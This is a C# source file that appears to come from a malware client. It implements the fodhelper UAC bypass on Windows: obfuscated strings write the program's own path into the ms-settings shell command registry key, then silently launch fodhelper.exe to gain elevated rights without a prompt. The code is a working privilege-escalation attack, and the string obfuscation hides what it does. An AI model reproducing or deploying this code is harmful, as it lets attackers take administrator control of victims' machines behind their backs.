using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace Client
{
	public class delta
	{
		[DllImport("kernel32.dll")]
		public static extern int WinExec(string exeName, int operType);

		public delta()
		{
			if (AlphaAndOmega.IsAdmin())
			{
				return;
			}
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				currentUser.CreateSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyVgy'yo~~cdmyVyboffVezodVieggkdn") ?? "");
				RegistryKey registryKey = currentUser.OpenSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyVgy'yo~~cdmyVyboffVezodVieggkdn") ?? "", writable: true);
				registryKey.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
				registryKey.SetValue(AlphaAndOmega.BCutEncrypt("Nofomk~oOroi\u007f~o"), "");
				currentUser.Close();
				delta.WinExec(string.Concat(str1: Environment.GetFolderPath(Environment.SpecialFolder.Windows) + AlphaAndOmega.BCutEncrypt("VYsy~og98Vlenbofzox$oro"), str0: AlphaAndOmega.BCutEncrypt("ign$oro*%a*Y^KX^*")), 0);
				Thread.Sleep(0);
				Environment.Exit(0);
			}
			catch (Exception)
			{
			}
		}
	}
}
